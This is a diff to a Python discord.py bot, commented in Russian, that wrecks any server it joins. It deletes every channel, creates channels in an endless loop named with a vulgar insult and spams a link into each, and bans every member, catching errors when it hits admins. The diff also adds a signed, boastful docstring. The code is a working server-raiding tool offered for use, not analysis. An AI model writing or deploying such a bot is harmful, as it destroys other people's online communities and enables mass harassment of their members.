@@ -1,7 +1,12 @@
 """
     По правилам написания кода, сначала должны проводиться импорты системных библиотек,
     потом установленных, и потом уже ваших.
-    Учитесь правильно писать код, дети. Говнокодить - вредно для здоровья.
+    Учитесь правильно писать код, дети. Говнокодить - вредно для здоровья (c) ExtremeCode
+    Эх, давно я не писал на discord.py... А то всё свои программы для проверки 
+    Целостности серверов в компании делаю... Скучно даже стало...
+    Код на теории должен работать. Пните потом, когда проверите на практике.
+    
+    Ваш нелюбимый Чай. :)
 """
 import asyncio
 
@@ -40,12 +45,14 @@ async def on_guild_join(server):
 # Даже ребёнок поймет, что это.
 async def delete_channels(channels):
     for channel in channels:
+        if str(channel.name) == "Вас трахнули":
+            continue
         await channel.delete()
 
 # Даже ребёнок поймет, что это 2
 async def create_trash_channels(server):
     while True:
-        channel = await server.create_text_channel(link, overwrite=None)
+        channel = await server.create_text_channel("Вас трахнули.", overwrite=None)
         await channel.send(link)
 
 # Даже ребёнок поймет, что это 3
@@ -53,9 +60,9 @@ async def kill_fucking_all_of_them(members):
     for member in members:
         try:
             await member.ban(reason=link)
+# Иногда бот может встретить админа, поэтому чтобы код не ломался,
+# Нужно использовать "try except" конструкцию.     
         except Exception as e:
-            # Иногда бот может встретить админа, поэтому чтобы код не ломался,
-            # Нужно использовать "try except" конструкцию. 
             print(e)
 
 bot.run(settings['token'])
